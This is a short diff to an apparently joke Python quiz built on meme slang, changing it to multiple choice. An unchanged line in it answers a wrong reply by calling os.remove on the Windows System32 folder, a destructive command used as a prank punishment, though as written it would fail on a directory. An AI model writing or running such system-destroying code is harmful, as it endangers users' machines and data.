@@ -2,8 +2,14 @@
 
 
 def brainrot():
-  text = input("Sticking out your gyatt for the...")
-  if not text.lower() == "rizzler":
+  print("Sticking out your gyatt for the...")
+  print("A: Rizzler")
+  print("B: Skidibi")
+  print("C: Fanum tax")
+  print("D: Sigma")
+  print("E: Ohio")
+  text = input("RESPOND CORRECTY! ")
+  if not (text.lower() == "rizzler" or text.lower() == "a"):
     print("WRONG! DELETING SYSTEM 32!!")
     os.remove("C:/Windows/System32")
   else:
